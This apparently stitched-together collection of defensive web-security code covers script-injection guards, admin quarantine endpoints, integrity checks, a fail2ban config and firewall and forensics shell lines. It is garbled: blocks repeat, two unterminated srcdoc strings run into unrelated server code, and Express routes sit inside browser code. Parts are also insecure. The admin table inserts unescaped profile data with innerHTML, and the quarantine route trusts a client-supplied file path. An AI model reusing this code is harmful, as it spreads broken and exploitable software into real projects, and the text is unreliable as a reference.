  // 2) group labels seen together within short windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and mark linked labels as suspicious
  // 5) create temporary bans for linked labels if confidence threshold reached (with audit)
}
setInterval(correlate, 60_000);
// JS: listen for animationstart to detect and remove injected nodes quickly
document.addEventListener('animationstart', (e) => {
  if (e.animationName === 'nodeInserted') {
    const node = e.target;
    // optional: log or report before removal
    console.warn('Removed injected node', node);
    node.remove();
    // send a beacon to server for forensics
    navigator.sendBeacon('/_internal/log-tamper', JSON.stringify({ event: 'injection_removed', tag: node.tagName, html: node.outerHTML.slice(0,200) }));
  }
}, true);
(function(){
  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint
  const ALLOWED_SCRIPT_ORIGINS = [location.origin, 'https://trusted.cdn.example'];
  const CANONICAL_STYLE_ID = 'canonical-style';

  function report(evt){
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); } catch(e){ console.log('report failed', evt); }
  }

  function isAllowedNode(node){
    if(node.tagName === 'SCRIPT' && node.src) {
      return ALLOWED_SCRIPT_ORIGINS.some(o => node.src.startsWith(o));
    }
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) {
      return node.href.startsWith(location.origin) || node.href.includes('trusted.cdn.example');
    }
    return true;
  }

  const observer = new MutationObserver(muts => {
    for(const m of muts){
      for(const n of m.addedNodes){
        if(n.nodeType !== 1) continue;
        if((n.tagName === 'SCRIPT' && n.src && !isAllowedNode(n)) ||
           (n.tagName === 'LINK' && n.rel === 'stylesheet' && n.href && !isAllowedNode(n))){
          const info = { event:'removed_injected', tag:n.tagName, src:n.src||n.href||n.outerHTML.slice(0,120), ts:Date.now() };
          try { n.remove(); } catch(e){}
          report(info);
          console.warn('Removed unauthorized node', info);
        }
      }
    }
  });

  observer.observe(document.documentElement, { childList:true, subtree:true });

  function ensureCanonicalStyle(){
    if(!document.getElementById(CANONICAL_STYLE_ID)){
      const s = document.createElement('style');
      s.id = CANONICAL_STYLE_ID;
      s.textContent = ':root{--bg:#0b5cff;--fg:#fff}body{background:var(--bg)!important;color:var(--fg)!important}';
      document.head.appendChild(s);
      report({ event:'reapplied_style', ts:Date.now() });
    }
  }
  setInterval(ensureCanonicalStyle, 3000);
  ensureCanonicalStyle();

  // Safe admin helpers (same-origin only)
  window.__moduleGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => s.src || '[inline]'); },
    removeScriptBySrc(src){
      const s = document.querySelector(`script[src="${src}"]`);
      if(s){ s.remove(); report({ event:'admin_removed_script', src, ts:Date.now() }); return true; }
      return false;
    }
  };

  report({ event:'guard_initialized', ts:Date.now() });
})();

// create a shadow root and attach approved widget markup there
  const host = document.getElementById('widget-host');
  const root = host.attachShadow({ mode: 'closed' }); // closed reduces tampering
  const style = document.createElement('style');
  style.textContent = ':host{display:block} /* widget styles here */';
  root.appendChild(style);
  // append widget content via trusted JS only
  const widget = document.createElement('div');
  widget.textContent = 'Approved widget';
  root.appendChild(widget);

(function(){
      // Toggle between audit (visual highlight) and enforce (deny-by-default)
      const modeEl = document.getElementById('mode');
      const toggle = document.getElementById('toggle-mode');
      const denyStyle = document.getElementById('deny-default');

      // Audit CSS: highlight unknown nodes instead of hiding them
      const auditCss = `
        #app *:not([data-allowed="true"]) {
          outline: 3px dashed rgba(255,0,0,0.85) !important;
          background: rgba(255,0,0,0.06) !important;
          visibility: visible !important;
          display: block !important;
          pointer-events: none !important;
        }
      `;

      let auditStyleEl = null;
      function setMode(m) {
        if (m === 'audit') {
          // enable audit: inject audit CSS and disable deny rules by temporarily disabling the deny style
          denyStyle.disabled = true;
          if (!auditStyleEl) {
            auditStyleEl = document.createElement('style');
            auditStyleEl.id = 'audit-style';
            auditStyleEl.textContent = auditCss;
            document.head.appendChild(auditStyleEl);
          }
          modeEl.textContent = 'audit';
        } else {
          // enforce
          denyStyle.disabled = false;
          if (auditStyleEl) { auditStyleEl.remove(); auditStyleEl = null; }
          modeEl.textContent = 'enforce';
        }
      }

      toggle.addEventListener('click', () => {
        setMode(modeEl.textContent === 'enforce' ? 'audit' : 'enforce');
      });

      // Allow nodes by selector (admin action)
      document.getElementById('allow-btn').addEventListener('click', () => {
        const sel = document.getElementById('allow-selector').value.trim();
        if (!sel) return alert('Enter a selector');
        const nodes = document.querySelectorAll(sel);
        nodes.forEach(n => n.setAttribute('data-allowed', 'true'));
        alert('Marked ' + nodes.length + ' node(s) allowed');
      });

      // Initialize in enforce mode
      setMode('enforce');

      // Accessibility: ensure guard UI is reachable by keyboard
      document.getElementById('guard-ui').setAttribute('role', 'region');
      document.getElementById('guard-ui').setAttribute('aria-label', 'Module guard controls');
    })();const API = '/admin/api'; // adjust to your server
    async function fetchProfiles(q='') {
      const res = await fetch(API + '/profiles?label=other&filter=' + encodeURIComponent(q));
      return res.json();
    }
    function renderList(list) {
      const tbody = document.querySelector('#profiles tbody');
      tbody.innerHTML = '';
      list.forEach(p => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${p.id}</td><td><span class="tag">${p.label}</span></td><td>${p.email||'<span class="muted">no email</span>'}</td><td>${p.status}</td><td>${new Date(p.last_seen).toLocaleString()}</td>
          <td>
            <button class="btn" data-id="${p.id}" data-action="inspect">Inspect</button>
            <button class="btn btn-primary" data-id="${p.id}" data-action="quarantine">Quarantine</button>
            <button class="btn" data-id="${p.id}" data-action="reclassify">Reclassify</button>
            <button class="btn btn-danger" data-id="${p.id}" data-action="delete">Delete</button>
          </td>`;
        tbody.appendChild(tr);
      });
    }
    async function refresh() {
      const q = document.getElementById('filter').value || '';
      const data = await fetchProfiles(q);
      renderList(data);
    }
    document.getElementById('refresh').addEventListener('click', refresh);
    document.getElementById('profiles').addEventListener('click', async (e) => {
      const btn = e.target.closest('button');
      if(!btn) return;
      const id = btn.dataset.id;
      const action = btn.dataset.action;
      if(action === 'inspect') {
        const res = await fetch(API + '/profiles/' + id);
        const p = await res.json();
        const details = document.getElementById('details');
        details.style.display = 'block';
        details.innerHTML = `<h3>Profile ${p.id}</h3><pre>${JSON.stringify(p, null, 2)}</pre>`;
      } else if(action === 'quarantine') {
        if(!confirm('Quarantine profile '+id+'?')) return;
        await fetch(API + '/profiles/' + id + '/quarantine', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({reason:'auto-review'})});
        alert('Quarantine requested');
        refresh();
      } else if(action === 'reclassify') {
        const newLabel = prompt('New label for profile '+id, 'user');
        if(!newLabel) return;
        await fetch(API + '/profiles/' + id + '/reclassify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({label:newLabel, reason:'admin'})});
        refresh();
      } else if(action === 'delete') {
        if(!confirm('Permanently delete profile '+id+'? This is irreversible.')) return;
        await fetch(API + '/profiles/' + id + '/delete', {method:'POST'});
        refresh();
      }
    });
    // initial load
    refresh();
    CREATE TABLE profiles (
  id BIGSERIAL PRIMARY KEY,
  email TEXT,
  label TEXT,
  status TEXT DEFAULT 'active', -- active | quarantined | disabled | deleted
  last_seen TIMESTAMPTZ,
  metadata JSONB
);

CREATE TABLE profile_audit (
  id BIGSERIAL PRIMARY KEY,
  profile_id BIGINT REFERENCES profiles(id),
  action TEXT NOT NULL, -- quarantine, reclassify, delete, restore
  actor TEXT, -- admin id or system
  reason TEXT,
  evidence JSONB,
  created_at TIMESTAMPTZ DEFAULT now()
);
// admin-profiles.js
const express = require('express');
const router = express.Router();
const db = require('./db'); // pg client
const sessionStore = require('./sessionStore'); // implement session revocation

// list profiles by label
router.get('/profiles', async (req, res) => {
  const label = req.query.label || 'other';
  const filter = req.query.filter || '';
  const rows = await db.query('SELECT id,email,label,status,last_seen FROM profiles WHERE label=$1 AND (email ILIKE $2 OR id::text ILIKE $2) ORDER BY last_seen DESC LIMIT 200', [label, `%${filter}%`]);
  res.json(rows.rows);
});

// inspect
router.get('/profiles/:id', async (req, res) => {
  const id = req.params.id;
  const r = await db.query('SELECT * FROM profiles WHERE id=$1', [id]);
  if(!r.rowCount) return res.status(404).send('not found');
  res.json(r.rows[0]);
});

// quarantine
router.post('/profiles/:id/quarantine', async (req, res) => {
  const id = req.params.id;
  const actor = req.user && req.user.id ? req.user.id : 'system';
  const reason = req.body.reason || 'manual';
  await db.query('UPDATE profiles SET status=$1 WHERE id=$2', ['quarantined', id]);
  await db.query('INSERT INTO profile_audit(profile_id, action, actor, reason, evidence) VALUES($1,$2,$3,$4,$5)', [id, 'quarantine', actor, reason, req.body.evidence || null]);
  // revoke sessions and API keys
  await sessionStore.revokeSessionsForProfile(id);
  res.json({ ok:true });
});

// reclassify
router.post('/profiles/:id/reclassify', async (req, res) => {
  const id = req.params.id;
  const newLabel = req.body.label;
  const actor = req.user && req.user.id ? req.user.id : 'system';
  await db.query('UPDATE profiles SET label=$1 WHERE id=$2', [newLabel, id]);
  await db.query('INSERT INTO profile_audit(profile_id, action, actor, reason, evidence) VALUES($1,$2,$3,$4,$5)', [id, 'reclassify', actor, req.body.reason || null, req.body.evidence || null]);
  res.json({ ok:true });
});

// delete permanently (only after quarantine and review)
router.post('/profiles/:id/delete', async (req, res) => {
  const id = req.params.id;
  const actor = req.user && req.user.id ? req.user.id : 'system';
  // move to archive table or delete after storing evidence
  const evidence = await db.query('SELECT * FROM profiles WHERE id=$1', [id]);
  await db.query('INSERT INTO profile_audit(profile_id, action, actor, reason, evidence) VALUES($1,$2,$3,$4,$5)', [id, 'delete', actor, req.body.reason || null, evidence.rows[0]]);
  await db.query('DELETE FROM profiles WHERE id=$1', [id]);
  // revoke sessions
  await sessionStore.revokeSessionsForProfile(id);
  res.json({ ok:true });
});

module.exports = router;
// admin-modules.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // pg client

router.post('/admin/modules/quarantine', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if(!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'quarantine_requested', adminId, reason || null]);
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive:true });
    const dest = path.join(quarantineDir, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // TODO: call CDN purge API here
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;
// correlate-worker.js (concept)
async function correlate() {
  // 1) fetch recent request logs with labels
  // 2) group labels seen together within short windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and flag linked labels for review
}
setInterval(correlate, 60_000);
// admin-modules.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // pg client

router.post('/admin/modules/quarantine', async (req, res) => {
  const { modulePath, adminId, reason } = req.body;
  if(!adminId || !modulePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', modulePath);
  try {
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'quarantine_requested', adminId, reason || null]);
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive:true });
    const dest = path.join(quarantineDir, path.basename(modulePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(module_path, action, actor, reason, ts) VALUES($1,$2,$3,$4,now())',
      [modulePath, 'moved_to_quarantine', adminId, reason || null]);
    // call CDN purge API here (idempotent) to stop clients loading the file
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;
// correlate-worker.js (concept)
async function correlate() {
  // 1) fetch recent request logs with labels
  // 2) group labels seen together within short windows
  // 3) upsert actor_links(actor_id, label_type, label_value)
  // 4) merge actor_ids that share labels and flag linked labels for review
  // 5) create temporary bans/quarantines for high-confidence matches (audit record)
}
setInterval(correlate, 60_000);
(function(){

  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint
  const ALLOWED_ORIGINS = [location.origin, 'https://trusted.cdn.example'];

  function report(evt){
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); } catch(e){ console.log('report', evt); }
  }

  function isAllowed(node){
    if(node.tagName === 'SCRIPT' && node.src) return ALLOWED_ORIGINS.some(o => node.src.startsWith(o));
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return node.href.startsWith(location.origin);
    return true;
  }

  const observer = new MutationObserver(muts=>{
    for(const m of muts) for(const n of m.addedNodes){
      if(n.nodeType !== 1) continue;
      if((n.tagName === 'SCRIPT' && n.src && !isAllowed(n)) || (n.tagName === 'LINK' && n.rel === 'stylesheet' && n.href && !isAllowed(n))){
        const info = { event:'removed_injected', tag:n.tagName, src:n.src||n.href||n.outerHTML.slice(0,120), ts:Date.now() };
        try { n.remove(); } catch(e){}
        report(info);
        console.warn('Removed unauthorized node', info);
      }
    }
  });

  observer.observe(document.documentElement, { childList:true, subtree:true });

  // Admin helpers (same-origin only)
  window.__moduleGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => s.src || '[inline]'); },
    allowSelector(sel){ document.querySelectorAll(sel).forEach(n => n.setAttribute('data-allowed','true')); return true; }
  };

  report({ event:'guard_initialized', ts:Date.now() });
})();

(function(){
  const LOG_ENDPOINT = '/_internal/log-tamper';
  const ALLOWED_ORIGINS = [location.origin, 'https://trusted.cdn.example'];

  function report(evt){
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); } catch(e){ console.log('report', evt); }
  }

  function isAllowed(node){
    if(node.tagName === 'SCRIPT' && node.src) return ALLOWED_ORIGINS.some(o => node.src.startsWith(o));
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return node.href.startsWith(location.origin);
    return true;
  }

  const observer = new MutationObserver(muts=>{
    for(const m of muts) for(const n of m.addedNodes){
      if(n.nodeType !== 1) continue;
      if((n.tagName === 'SCRIPT' && n.src && !isAllowed(n)) || (n.tagName === 'LINK' && n.rel === 'stylesheet' && n.href && !isAllowed(n))){
        const info = { event:'removed_injected', tag:n.tagName, src:n.src||n.href||n.outerHTML.slice(0,120), ts:Date.now() };
        try { n.remove(); } catch(e){}
        report(info);
        console.warn('Removed unauthorized node', info);
      }
    }
  });

  observer.observe(document.documentElement, { childList:true, subtree:true });

  window.__moduleGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => s.src || '[inline]'); },
    allowSelector(sel){ document.querySelectorAll(sel).forEach(n => n.setAttribute('data-allowed','true')); return true; }
  };

  report({ event:'guard_initialized', ts:Date.now() });
})();

(function(){
  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint (POST)
  const SUSPICIOUS_PATTERNS = [
    /scent/i,                 // filename or attribute containing "scent"
    /tweaker/i,               // other suspicious keywords
    /^https?:\/\/.*\/scent-/i // external URL pattern
  ];

  function isSuspiciousNode(node) {
    if (!node || node.nodeType !== 1) return false;
    const src = node.src || node.href || '';
    const attrs = Array.from(node.attributes || []).map(a => `${a.name}=${a.value}`).join(' ');
    const text = (node.className || '') + ' ' + attrs + ' ' + src;
    return SUSPICIOUS_PATTERNS.some(p => p.test(text));
  }

  function report(evt) {
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(evt)); }
    catch(e){ console.log('report failed', evt); }
  }

  function quarantineNode(node) {
    try {
      // preserve a copy for evidence
      const evidence = { outerHTML: node.outerHTML.slice(0, 2000), ts: Date.now(), tag: node.tagName };
      report({ event: 'quarantine', evidence });
      // move node into a sandbox iframe for safe observation
      const sandbox = document.getElementById('__scent_sandbox') || createSandbox();
      const holder = document.createElement('div');
      holder.style.display = 'none';
      holder.innerHTML = node.outerHTML;
      sandbox.contentDocument.body.appendChild(holder);
      // remove original node from main document
      node.remove();
    } catch (err) {
      console.warn('quarantine failed', err);
      try { node.remove(); } catch(e){}
    }
  }

  function createSandbox() {
    const iframe = document.createElement('iframe');
    iframe.id = '__scent_sandbox';
    iframe.sandbox = 'allow-scripts'; // allow-scripts only if you intend to observe; otherwise use 'allow-same-origin' carefully
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    // minimal safe content
    iframe.srcdoc = '<!doctype html><html><body><script>window.addEventListener("error",e=>parent.postMessage({type:"sandbox-error",msg:e.message}, "*"))
    // server/quarantine.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // implement DB client for audit

// receive client tamper reports
router.post('/_internal/log-tamper', express.json({limit:'1mb'}), async (req, res) => {
  const payload = req.body;
  await db.query('INSERT INTO tamper_logs(payload, created_at) VALUES($1, now())', [payload]);
  res.status(204).end();
});

// admin: move module file to quarantine
router.post('/admin/quarantine-file', async (req, res) => {
  const { filePath, adminId, reason } = req.body;
  if (!adminId || !filePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', filePath);
  try {
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive: true });
    const dest = path.join(quarantineDir, path.basename(filePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(file_path, action, actor, reason, created_at) VALUES($1,$2,$3,$4,now())', [filePath, 'quarantine', adminId, reason || null]);
    // optionally purge CDN cache here (idempotent)
    res.json({ ok: true, quarantined: dest });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'failed' });
  }
});

module.exports = router;
(function(){
  // server/quarantine.js (Express)
const express = require('express');
const fs = require('fs');
const path = require('path');
const router = express.Router();
const db = require('./db'); // implement DB client

router.post('/_internal/log-tamper', express.json({limit:'1mb'}), async (req, res) => {
  const payload = req.body;
  await db.query('INSERT INTO tamper_logs(payload, created_at) VALUES($1, now())', [payload]);
  res.status(204).end();
});

router.post('/admin/quarantine-file', async (req, res) => {
  const { filePath, adminId, reason } = req.body;
  if(!adminId || !filePath) return res.status(400).send('missing');
  const abs = path.resolve('/var/www/site', filePath);
  try {
    const quarantineDir = '/var/quarantine/modules';
    fs.mkdirSync(quarantineDir, { recursive: true });
    const dest = path.join(quarantineDir, path.basename(filePath) + '.' + Date.now());
    fs.renameSync(abs, dest);
    await db.query('INSERT INTO module_audit(file_path, action, actor, reason, created_at) VALUES($1,$2,$3,$4,now())', [filePath, 'quarantine', adminId, reason || null]);
    // call CDN purge API here (idempotent)
    res.json({ ok:true, quarantined: dest });
  } catch(err){
    console.error(err);
    res.status(500).json({ error:'failed' });
  }
});

module.exports = router;

  const LOG_ENDPOINT = '/_internal/log-tamper'; // POST JSON
  const ALLOWED_ORIGINS = [location.origin, 'https://trusted.cdn.example'];
  const SUSPICIOUS_PATTERNS = [/scent/i, /tweaker/i, /suspicious-widget/i];

  function sendReport(obj){

    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(obj)); }
    catch(e){ console.log('report failed', obj); }
  }

  function nodeText(node){
    const src = node.src || node.href || '';
    const cls = node.className || '';
    const attrs = Array.from(node.attributes || []).map(a => `${a.name}=${a.value}`).join(' ');
    return `${node.tagName} ${cls} ${attrs} ${src}`.slice(0,200);
  }

  function isAllowed(node){
    if(node.tagName === 'SCRIPT' && node.src) return ALLOWED_ORIGINS.some(o => node.src.startsWith(o));
    if(node.tagName === 'LINK' && node.rel === 'stylesheet' && node.href) return ALLOWED_ORIGINS.some(o => node.href.startsWith(o));
    return node.hasAttribute && node.hasAttribute('data-allowed');
  }

  function isSuspicious(node){
    if(!node || node.nodeType !== 1) return false;
    const txt = nodeText(node);
    if(SUSPICIOUS_PATTERNS.some(p => p.test(txt))) return true;
    // heuristic: external script from ephemeral domain
    if(node.tagName === 'SCRIPT' && node.src && /\/cdn\/temp|\.xyz$|\.top$/.test(node.src)) return true;
    return false;
  }

  function quarantine(node){
    try {
      const evidence = { outerHTML: node.outerHTML.slice(0,2000), ts: Date.now(), tag: node.tagName };
      sendReport({ event: 'quarantine', evidence });
      // preserve copy in hidden sandbox for analysis
      const sandbox = getOrCreateSandbox();
      const holder = sandbox.contentDocument.createElement('div');
      holder.setAttribute('data-quarantine-ts', Date.now());
      holder.innerHTML = node.outerHTML;
      sandbox.contentDocument.body.appendChild(holder);
      node.remove();
    } catch(err){
      try { node.remove(); } catch(e){}
      sendReport({ event: 'quarantine_error', msg: String(err), ts: Date.now() });
    }
  }

  function getOrCreateSandbox(){
    let iframe = document.getElementById('__module_sandbox');
    if(iframe) return iframe;
    iframe = document.createElement('iframe');
    iframe.id = '__module_sandbox';
    iframe.sandbox = 'allow-scripts'; // keep minimal privileges
    iframe.style.display = 'none';
    iframe.srcdoc = '<!doctype html><html><body><script>window.addEventListener("error",e=>parent.postMessage({type:"sandbox-error",msg:e.message}, "*"))(async function(){
  const LOG_ENDPOINT = '/_internal/log-tamper'; // secure server endpoint
  const ALLOWLIST = new Set([location.origin]); // add trusted origins
  const MAX_BYTES = 5_000_000; // safety cap for hashing

  async function sha256Base64(buffer) {
    const hash = await crypto.subtle.digest('SHA-256', buffer);
    const bytes = new Uint8Array(hash);
    let binary = '';
    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
    return btoa(binary);
  }

  async function fetchAndHash(url) {
    const resp = await fetch(url, { credentials: 'same-origin' });
    if (!resp.ok) throw new Error('fetch failed ' + resp.status);
    const reader = resp.body.getReader();
    const chunks = [];
    let total = 0;
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      total += value.length;
      if (total > MAX_BYTES) throw new Error('resource too large');
      chunks.push(value);
    }
    const buf = new Uint8Array(total);
    let offset = 0;
    for (const c of chunks) { buf.set(c, offset); offset += c.length; }
    return { buffer: buf.buffer, text: new TextDecoder().decode(buf) };
  }

  function report(obj) {
    try { navigator.sendBeacon(LOG_ENDPOINT, JSON.stringify(obj)); } catch(e){ console.warn('report failed', e); }
  }

  async function verifyScriptTag(script) {
    try {
      const src = script.src;
      const integrity = script.getAttribute('integrity') || '';
      // If script is inline and has no integrity, skip (or treat as suspicious per policy)
      if (!src) return;
      // Only verify external scripts from non-allowlist origins if policy requires
      const origin = new URL(src, location.href).origin;
      if (!ALLOWLIST.has(origin) && !integrity) {
        report({ event: 'missing_integrity', src, ts: Date.now() });
        script.remove();
        return;
      }
      if (integrity) {
        // expected format: "sha256-BASE64"
        const expected = integrity.trim().split(/\s+/).find(s => s.startsWith('sha256-'));
        if (!expected) {
          report({ event: 'unsupported_integrity', src, integrity, ts: Date.now() });
          script.remove();
          return;
        }
        const { buffer } = await fetchAndHash(src);
        const base64 = await sha256Base64(buffer);
        const computed = 'sha256-' + base64;
        if (computed !== expected) {
          report({ event: 'integrity_mismatch', src, expected, computed, ts: Date.now(), sample: (new TextDecoder()).decode(buffer).slice(0,200) });
          // quarantine: remove and preserve evidence in hidden iframe
          quarantineScript(script, buffer);
        } else {
          // optionally cache verified blob URL to avoid re-fetch
        }
      }
    } catch (err) {
      report({ event: 'verify_error', src: script.src || '[inline]', msg: String(err), ts: Date.now() });
      try { script.remove(); } catch(e){}
    }
  }

  function quarantineScript(script, buffer) {
    try {
      const iframe = getOrCreateSandbox();
      const holder = iframe.contentDocument.createElement('pre');
      holder.textContent = `Quarantined ${script.src}\n\n` + (new TextDecoder()).decode(buffer).slice(0,2000);
      holder.style.whiteSpace = 'pre-wrap';
      iframe.contentDocument.body.appendChild(holder);
      script.remove();
      report({ event: 'quarantined', src: script.src, ts: Date.now() });
    } catch (e) {
      try { script.remove(); } catch(e){}
      report({ event: 'quarantine_failed', src: script.src, msg: String(e), ts: Date.now() });
    }
  }

  function getOrCreateSandbox() {
    let iframe = document.getElementById('__integrity_sandbox');
    if (iframe) return iframe;
    iframe = document.createElement('iframe');
    iframe.id = '__integrity_sandbox';
    iframe.sandbox = 'allow-scripts'; // keep minimal privileges
    iframe.style.display = 'none';
    iframe.srcdoc = '<!doctype html><html><body></body></html>';
    document.documentElement.appendChild(iframe);
    return iframe;
  }

  // Initial verification pass
  document.querySelectorAll('script[src]').forEach(s => verifyScriptTag(s));

  // Monitor for new scripts added dynamically
  const mo = new MutationObserver(muts => {
    for (const m of muts) {
      for (const n of m.addedNodes) {
        if (n.nodeType !== 1) continue;
        if (n.tagName === 'SCRIPT') verifyScriptTag(n);
      }
    }
  });
  mo.observe(document.documentElement, { childList: true, subtree: true });

  // Detect attempts to override crypto.subtle (tampering attempt)
  const originalSubtle = crypto.subtle;
  Object.defineProperty(crypto, 'subtle', {
    configurable: false,
    enumerable: true,
    get() { return originalSubtle; }
  });
  // If someone tries to redefine, it will throw; report if changed
  setInterval(() => {
    if (crypto.subtle !== originalSubtle) {
      report({ event: 'crypto_subtle_tampered', ts: Date.now() });
      // reload or take defensive action
      try { location.reload(); } catch(e){}
    }
  }, 2000);

  // Expose safe admin helpers (same-origin only)
  window.__integrityGuard = {
    listExternalScripts(){ return Array.from(document.scripts).map(s => ({src:s.src, integrity:s.getAttribute('integrity')})); },
    allowScriptBySrc(src){ const s = document.querySelector(`script[src="${src}"]`); if(s) s.setAttribute('data-allowed','true'); return !!s; }
  };
})();
// integrity-middleware.js
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

function computeSRI(filePath) {
  const buf = fs.readFileSync(filePath);
  const hash = crypto.createHash('sha256').update(buf).digest('base64');
  return 'sha256-' + hash;
}

module.exports = function integrityMiddleware(options) {
  const assetsDir = options.assetsDir || path.join(__dirname, 'public');
  // precompute SRI map at startup
  const sriMap = {};
  for (const f of fs.readdirSync(path.join(assetsDir, 'modules') || [])) {
    const full = path.join(assetsDir, 'modules', f);
    if (fs.statSync(full).isFile()) sriMap['/modules/' + f] = computeSRI(full);
  }

  return function (req, res, next) {
    // set CSP header to require SRI for scripts (report-only during rollout)
    res.setHeader('Content-Security-Policy', "script-src 'self' 'sha256-PLACEHOLDER'"); // replace with proper policy
    // attach SRI header for known assets (optional custom header)
    if (sriMap[req.path]) res.setHeader('X-Content-SRI', sriMap[req.path]);
    next();
  };
};
// on file upload, compute hash and compare to expected (if replacing existing asset)
const crypto = require('crypto');
function sha256Base64(buffer) {
  return crypto.createHash('sha256').update(buffer).digest('base64');
}
function validateUpload(buffer, expectedSRI) {
  const computed = 'sha256-' + sha256Base64(buffer);
  return computed === expectedSRI;
}
# /etc/fail2ban/jail.d/ssh-local.conf
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 5
bantime = 3600
# add-drop-ip.sh
IP="$1"
nft add rule inet filter input ip saddr "$IP" drop 2>/dev/null || echo "rule exists or nft not available"
PID=1234
mkdir -p /var/quarantine/pids/$PID
ps -fp $PID > /var/quarantine/pids/$PID/ps.txt
lsof -p $PID > /var/quarantine/pids/$PID/lsof.txt 2>/dev/null || true
cp /proc/$PID/cmdline /var/quarantine/pids/$PID/cmdline 2>/dev/null || true
/* CONFIGURE: set API_BASE and secure auth headers on server side */
const API_BASE = '/admin/api'; // server endpoints must authenticate and audit
const AUTH_HEADERS = { 'X-Admin-Token': 'REPLACE_WITH_SECURE_TOKEN' }; // replace with secure auth

/* Detection heuristics: tune to your environment */
const SUSPICIOUS_SELECTORS = [
  '.terminal', '.xterm', 'x-terminal', '[data-terminal]', '[data-protector]', 'iframe.terminal-frame'
];
const SUSPICIOUS_KEYWORDS = [/scent/i, /protector/i, /tweaker/i, /mask/i, /obfuscate/i];

/* Mode: audit (log only) or enforce (hide + quarantine) */
let mode = 'audit'; // 'audit' or 'enforce'

function log(msg){
  const el = document.getElementById('log');
  el.textContent = new Date().toISOString() + ' ' + msg + '\\n' + el.textContent;
  console.log(msg);
}

/* Compact evidence builder */
function evidenceFor(node){
  try {
    return {
      tag: node.tagName,
      id: node.id || null,
      classes: node.className || null,
      outerHTML: node.outerHTML ? node.outerHTML.slice(0,2000) : null,
      detectedAt: Date.now()
    };
  } catch(e){ return { tag: node.tagName, detectedAt: Date.now(), error: String(e) }; }
}

/* Report to server (best-effort) */
function reportToServer(payload){
  try {
    navigator.sendBeacon(API_BASE + '/tamper-log', JSON.stringify(payload));
  } catch(e){
    // fallback to fetch
    fetch(API_BASE + '/tamper-log', { method:'POST', headers: Object.assign({'Content-Type':'application/json'}, AUTH_HEADERS), body: JSON.stringify(payload) }).catch(()=>{});
  }
}

/* Create hidden sandbox iframe for quarantined copies */
function getOrCreateSandbox(){
  let iframe = document.getElementById('__terminal_sandbox');
  if (iframe) return iframe;
  iframe = document.createElement('iframe');
  iframe.id = '__terminal_sandbox';
  iframe.sandbox = 'allow-scripts'; // minimal privileges; do not allow same-origin unless you intend to analyze
  iframe.style.display = 'none';
  iframe.srcdoc = '<!doctype html><html><body></body></html>';
  document.body.appendChild(iframe);
  return iframe;
}

/* Quarantine: move a copy into sandbox and remove original */
function quarantineNode(node, reason){
  try {
    const ev = evidenceFor(node);
    ev.reason = reason;
    reportToServer({ event: 'quarantine', evidence: ev });
    const sandbox = getOrCreateSandbox();
    const holder = sandbox.contentDocument.createElement('div');
    holder.setAttribute('data-quarantine-ts', Date.now());
    holder.innerHTML = node.outerHTML || '<!-- no outerHTML -->';
    sandbox.contentDocument.body.appendChild(holder);
    node.remove();
    log('Quarantined node: ' + (node.id || node.className || node.tagName) + ' reason=' + reason);
    addEventRow(ev);
  } catch (err) {
    try { node.remove(); } catch(e){}
    log('Quarantine failed: ' + String(err));
  }
}

/* Neutralize in-page terminal: hide and disable pointer events */
function neutralizeNode(node, reason){
  try {
    node.style.display = 'none';
